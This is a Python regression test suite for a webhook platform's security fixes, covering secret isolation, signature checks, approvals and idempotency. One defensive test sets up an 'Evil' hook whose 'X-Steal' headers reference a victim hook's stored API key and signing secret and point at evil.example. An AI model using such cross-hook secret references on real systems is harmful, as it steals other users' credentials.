"""0.274.0: fixes from the independent review of webhook platform M4 (signatures, secrets, tools, approval), each red
before the fix.

    python tests/run.py webhook_m4_review      (no network, no model)

P1 a client-sent {"$secret": ...} reference read (and could delete) ANOTHER hook's secrets, across brains;
P1 a broken MCP call after it was sent was reported "failed" (certainly not done) instead of unknown;
P2 POST /webhooks ignored `verify` (and accepted provider poscake);
P2 approval was read from the event snapshot, not the hook of now;
P2 approving a branch of an event that ended unknown did nothing; an approval racing the end of a run left the event
   stuck forever;
P2 a tool of a hook whose brain folder is gone ran in the default brain;
P2 a captured provider delivery replayed with a fresh Idempotency-Key was a new event;
P3 vault errors as 500s; no cross-process lock; simulate ignored a logged event's _event; uppercase hex signatures;
   a renamed masked header silently dropped; meta-tools as action tools.
"""
from _paths import ROOT, SERVER  # noqa: E402,F401
import asyncio
import hashlib
import hmac
import json
import os
import sys
import tempfile
import time
from pathlib import Path

STATE = Path(tempfile.mkdtemp(prefix="javis-wh-m4r-"))
os.environ["JAVIS_STATE_DIR"] = str(STATE)
os.environ["JAVIS_NO_REAL_JUDGE_ENGINE"] = "1"
os.environ["JAVIS_WH_NO_NETWORK"] = "1"
os.environ.pop("JAVIS_WH_MASTER_KEY", None)
try:
    sys.stdout.reconfigure(encoding="utf-8")
except Exception:
    pass

import httpx  # noqa: E402
import webhook_actions as wa  # noqa: E402
import webhook_secrets as wsec  # noqa: E402
import webhook_store as ws  # noqa: E402
import webhook_triggers as wt  # noqa: E402
import webhook_verify as wv  # noqa: E402

fails = []


def check(name, cond, them=""):
    print(("ok   " if cond else "FAIL ") + name + (("  [" + str(them) + "]") if them and not cond else ""))
    if not cond:
        fails.append(name)


FEAT = Path(tempfile.mkdtemp(prefix="m4r-feat-"))
hits, tool_calls, sent = [], [], []
tool_answer = {"v": "ok"}


def handler(req):
    hits.append((req.url.host, dict(req.headers)))
    return httpx.Response(200)


async def run_task(brain, text, level):
    return "ok", ""


async def no_wf(*a, **k):
    return "", "", False


async def send(chat_id, text, viec=None, web="", brain="", dedup=""):
    sent.append(text)
    return True, ""


async def call_tool(brain, level, name, args):
    tool_calls.append(name)
    return tool_answer["v"]


def make():
    return wt.WebhookFeature(wt.WebhookDeps(state_dir=lambda: FEAT, run_task=run_task, run_workflow=no_wf, send=send,
                                            base_url=lambda _r: "", workflow_exists=lambda b, s: True, call_tool=call_tool,
                                            http_transport=httpx.MockTransport(handler), resolve=lambda h: ["93.184.216.34"]))


SEC = "gh-signing-SECRET-123"


async def main():
    f = make()
    st = f.store()
    victim, vtok, _ = f.create("/brainA", name="Victim", target="", text="", level="full", verify={"provider": "github", "secret": SEC},
                               actions=[{"id": "crm", "kind": "http", "url": "https://crm.example/h", "headers": {"X-Api-Key": "sk-VICTIM"}}])
    vid = victim["id"]

    # P1-1: foreign secret references
    _, _, err = f.create("/brainB", name="Evil", target="", text="", level="full",
                         actions=[{"id": "x", "kind": "http", "url": "https://evil.example/h",
                                   "headers": {"X-Steal": {"$secret": f"{vid}/a/crm/X-Api-Key"}, "X-Steal2": {"$secret": f"{vid}/verify"}}}])
    check("P1: create with a reference to another hook's secret is refused", "cannot be a secret reference" in err, err)
    evil, etok, _ = f.create("/brainB", name="Evil", target="", text="", level="full",
                             actions=[{"id": "x", "kind": "http", "url": "https://evil.example/h", "headers": {"X-K": "own"}}])
    _, err, _ = f.update(evil["id"], {"actions": [{"id": "x", "kind": "http", "url": "https://evil.example/h",
                                                   "headers": {"X-K": {"$secret": f"{vid}/a/crm/X-Api-Key"}}}]})
    check("P1: update with a foreign reference is refused", "cannot be a secret reference" in err, err)
    _, err, _ = f.update(evil["id"], {"verify": {"provider": "github", "secret": {"$secret": f"{vid}/verify"}}})
    check("P1: a foreign signing-secret reference is refused", "cannot be a reference" in err, err)
    # even if a reference were planted in the stored configuration by hand, the run refuses it
    def plant(hid, fn):
        row = st._db.execute("SELECT config FROM hooks WHERE id=?", (hid,)).fetchone()
        cfg = json.loads(row[0])
        fn(cfg)
        st._db.execute("UPDATE hooks SET config=? WHERE id=?", (json.dumps(cfg), hid))
    plant(evil["id"], lambda c: c["actions"][0]["headers"].update({"X-K": {"$secret": f"{vid}/a/crm/X-Api-Key"}}))
    hits.clear()
    code, r = await f.accept(evil["id"], etok, b"{}", "application/json", "steal")
    await f.wait_idle()
    check("P1: a planted foreign reference is never resolved at run time (nothing sent, the delivery blocked)", not hits
          and st.get(r["run_id"])["branches"][0]["status"] == "blocked", (hits, st.get(r["run_id"])["branches"]))
    plant(evil["id"], lambda c: c["actions"][0].update(headers={}))
    f.update(evil["id"], {"actions": [{"id": "x", "kind": "http", "url": "https://evil.example/h"}]})
    check("P1: the victim's secrets are intact (no cross-hook deletion)", f.vault.get(f"{vid}/a/crm/X-Api-Key") == "sk-VICTIM"
          and f.vault.get(f"{vid}/verify") == SEC)

    # P2-3: POST /webhooks takes verify (and refuses poscake)
    from fastapi import FastAPI
    app = FastAPI()
    app.include_router(f.router)
    cl = httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://t")
    r = await cl.post("/webhooks", json={"brain": "/b", "name": "S", "target": "task", "text": "x",
                                         "verify": {"provider": "github", "secret": SEC}})
    created = r.json()
    check("P2: POST /webhooks keeps the signature check", r.status_code == 200 and created["hook"]["verify"]["provider"] == "github", r.text)
    code, _ = await f.accept(created["hook"]["id"], created["token"], b"{}", "application/json", "u")
    check("P2: ... so an unsigned body is refused", code == 401)
    r = await cl.post("/webhooks", json={"brain": "/b", "name": "P", "target": "task", "text": "x",
                                         "verify": {"provider": "poscake", "secret": "x" * 10}})
    check("P2: POST /webhooks refuses provider poscake", r.status_code == 400 and "POSCake" in r.text, r.text)

    # P2-8: provider ids win over a fresh Idempotency-Key
    body = b'{"id":"evt_9","type":"invoice.paid"}'
    hs, tks, _ = f.create("/b", name="Stripe", target="task", text="x", verify={"provider": "stripe", "secret": "whsec_abcdefgh"})
    t = int(time.time())
    sig = f"t={t},v1=" + hmac.new(b"whsec_abcdefgh", f"{t}.".encode() + body, hashlib.sha256).hexdigest()
    f._kick = lambda: None
    c1, a1 = await f.accept(hs["id"], tks, body, "application/json", "fresh-1", headers={"stripe-signature": sig})
    c2, a2 = await f.accept(hs["id"], tks, body, "application/json", "fresh-2", headers={"stripe-signature": sig})
    del f._kick
    check("P2: a replayed Stripe delivery with a new Idempotency-Key is still a duplicate", c1 == 202 and c2 == 200 and a2.get("duplicate"),
          (c1, c2, a2))
    await f.wait_idle()

    # P2-4: approval switched on after receipt applies to waiting events
    ht, tkt, _ = f.create("/b", name="Tool", target="", text="", level="full",
                          actions=[{"id": "pos", "kind": "tool", "tool": "pos_x", "approve": False}])
    f._kick = lambda: None
    code, r = await f.accept(ht["id"], tkt, b"{}", "application/json", "ap1")
    f.update(ht["id"], {"actions": [{"id": "pos", "kind": "tool", "tool": "pos_x", "approve": True}]})
    del f._kick
    tool_calls.clear()
    f._kick()
    await f.wait_idle()
    check("P2: approval turned on after the event arrived is required", not tool_calls
          and st.get(r["run_id"])["branches"][0]["status"] == "approval", st.get(r["run_id"])["branches"])

    # P2-5: approve a branch of an event that ended unknown (because of a sibling)
    st._db.execute("UPDATE deliveries SET status='approval' WHERE event_id=?", (r["run_id"],))
    st._db.execute("INSERT INTO deliveries(event_id, action_id, generation, kind, delivery_id, status, dispatched_at,"
                   " finished_at) VALUES(?,?,1,?,?,?,?,?)", (r["run_id"], "crm", "http", "dlv_z", "unknown", time.time(),
                                                             time.time()))
    st._db.execute("UPDATE events SET status='unknown' WHERE id=?", (r["run_id"],))
    plant(ht["id"], lambda c: c["actions"].append({"id": "crm", "kind": "http", "url": "https://crm.example/h",
                                                   "headers": {}, "body": "fields", "timeout_s": 15.0, "retry": "never",
                                                   "allow_private": False}))
    ok, why = st.approve(r["run_id"], "pos", "approve")
    check("P2: approving on an event that is unknown requeues it so the approved branch runs", ok
          and st.get(r["run_id"])["status"] == "queued", (ok, why, st.get(r["run_id"])["status"]))
    f._kick()
    await f.wait_idle()
    ev = st.get(r["run_id"])
    check("... it runs, and the event stays unknown for the other branch", tool_calls == ["pos_x"] and ev["status"] == "unknown",
          (tool_calls, ev["status"]))

    # P2-6: approve racing the end of a run: settle re-reads the branches
    s2 = ws.Store(Path(tempfile.mkdtemp(prefix="m4r-race-")) / "e.sqlite3")
    c, i = s2.ingest({"id": "wh_r", "brain": "/b"}, b"{}", "", "race")
    s2.triage_commit(i["event_id"], {"decision": "run"}, [])
    w = s2.claim("W")
    s2.branches_init(w["id"], w["fence"], [{"id": "pos", "kind": "tool"}], wa.delivery_id)
    s2.branch_finish(w["id"], w["fence"], "pos", "approval", "waiting")
    ok, _ = s2.approve(w["id"], "pos", "approve")             # lands while the run is still "running"
    status, _ = s2.settle(w["id"], w["fence"], lambda rows: ("", ""))
    check("P2: an approval during the end of a run requeues the event (never stuck waiting with a pending branch)",
          ok and status == "queued" and s2.get(w["id"])["status"] == "queued", (status, s2.get(w["id"])["status"]))

    # P1-2: a broken tool call after it was sent is unknown
    tool_answer["v"] = "ERROR: gọi tool lỗi: TimeoutError: rpc timeout"
    hx, tkx, _ = f.create("/b", name="Hỏng", target="", text="", level="full",
                          actions=[{"id": "pos", "kind": "tool", "tool": "pos_y", "approve": False}])
    code, r = await f.accept(hx["id"], tkx, b"{}", "application/json", "brk")
    await f.wait_idle()
    check("P1: a broken call (exception caught by the hub) is unknown, never 'certainly refused'",
          st.get(r["run_id"])["branches"][0]["status"] == "unknown" and st.get(r["run_id"])["status"] == "unknown")
    tool_answer["v"] = "ERROR: kết nối đang đặt mức quyền hạn chế"
    code, r = await f.accept(hx["id"], tkx, b"{}", "application/json", "ref")
    await f.wait_idle()
    check("... a refusal by the hub guard stays failed", st.get(r["run_id"])["branches"][0]["status"] == "failed")
    tool_answer["v"] = "ok"
    check("P1: the webhook waits longer than the MCP transport (its timeout surfaces as unknown first)", wa.TOOL_TIMEOUT_S > 120)

    # P3-12: simulate a logged provider event uses its _event
    hg, tkg, _ = f.create("/b", name="GH", target="task", text="x", verify={"provider": "github", "secret": SEC},
                          rules={"filter": {"path": "_event.type", "op": "eq", "value": "push"}})
    b = b'{"ref": "main"}'
    sig = "sha256=" + hmac.new(SEC.encode(), b, hashlib.sha256).hexdigest()
    f._kick = lambda: None
    code, r = await f.accept(hg["id"], tkg, b, "application/json", "", headers={"x-hub-signature-256": sig, "x-github-event": "push",
                                                                                 "x-github-delivery": "d1"})
    del f._kick
    code_s, sim = f.simulate({"id": hg["id"], "event": r["run_id"]})
    check("P3: simulating a logged provider event sees its _event (same decision as on receipt)", code == 202 and sim["decision"] == "run",
          (code, sim.get("decision")))
    await f.wait_idle()
    await cl.aclose()


asyncio.run(main())

# P3: vault errors are SecretError, not crashes
os.environ["JAVIS_WH_MASTER_KEY"] = "!!!not-base64!!!"
try:
    wsec.Vault(Path(tempfile.mkdtemp())).put("a/b", "v")
    r = "no error"
except wsec.SecretError as e:
    r = "SecretError"
except Exception as e:
    r = type(e).__name__
del os.environ["JAVIS_WH_MASTER_KEY"]
check("P3: a bad JAVIS_WH_MASTER_KEY is a clear SecretError", r == "SecretError", r)
d = Path(tempfile.mkdtemp())
(d / "webhook_keys.json").write_text("{damaged")
try:
    wsec.Vault(d).put("a/b", "v")
    r = "no error"
except wsec.SecretError:
    r = "SecretError"
except Exception as e:
    r = type(e).__name__
check("P3: a damaged key file is a clear SecretError", r == "SecretError", r)

# P3: cross-process lock (two processes putting 30 secrets each into one vault: none lost)
import subprocess  # noqa: E402
vd = Path(tempfile.mkdtemp(prefix="m4r-lock-"))
code = ("import sys, webhook_secrets as w\n"
        "v = w.Vault(sys.argv[1])\n"
        "for i in range(30):\n"
        "    v.put(f'{sys.argv[2]}/{i}', 'x')\n")
ps = [subprocess.Popen([sys.executable, "-c", code, str(vd), f"p{n}"], env=dict(os.environ, PYTHONPATH=str(SERVER))) for n in range(3)]
[p.wait(timeout=120) for p in ps]
check("P3: three processes writing one vault lose no secret", len(wsec.Vault(vd).names()) == 90, len(wsec.Vault(vd).names()))

# P3: uppercase hex, renamed masked header, meta-tools
G = wv.validate({"provider": "hmac_sha256", "secret": SEC, "header": "X-Sig"})
up = hmac.new(SEC.encode(), b"x", hashlib.sha256).hexdigest().upper()
check("P3: an uppercase hex signature is accepted", wv.verify(G, SEC, {"x-sig": up}, b"x")[0])
old = [{"id": "c", "kind": "http", "url": "https://x.vn", "allow_private": False, "headers": {"X-Old": {"$secret": "h/a/c/X-Old"}}}]
try:
    wa.merge_secrets(wa.validate([{"id": "c", "kind": "http", "url": "https://x.vn", "headers": {"X-New": "••••"}}]), old)
    r = "dropped"
except wa.ActionError as e:
    r = str(e)
check("P3: a renamed header still showing the mask asks for the value (never silently dropped)", "enter header X-New again" in r, r)
for meta in ("javis_run_tool", "javis_search_tools"):
    try:
        wa.validate([{"id": "t", "kind": "tool", "tool": meta, "args": {"name": "{tool}"}}])
        r = "accepted"
    except wa.ActionError as e:
        r = str(e)
    check(f"P3: meta-tool {meta} cannot be an action (the payload would pick the tool)", "name the tool itself" in r, r)

src = (SERVER / "main.py").read_text(encoding="utf-8")
check("P2: a tool of a hook whose brain folder is gone does not run in the default brain",
      "the webhook's brain folder no longer exists" in src)

if fails:
    print(f"\nFAIL {len(fails)}: " + ", ".join(fails))
    sys.exit(1)
print("\nOK - test_webhook_m4_review: all pass")
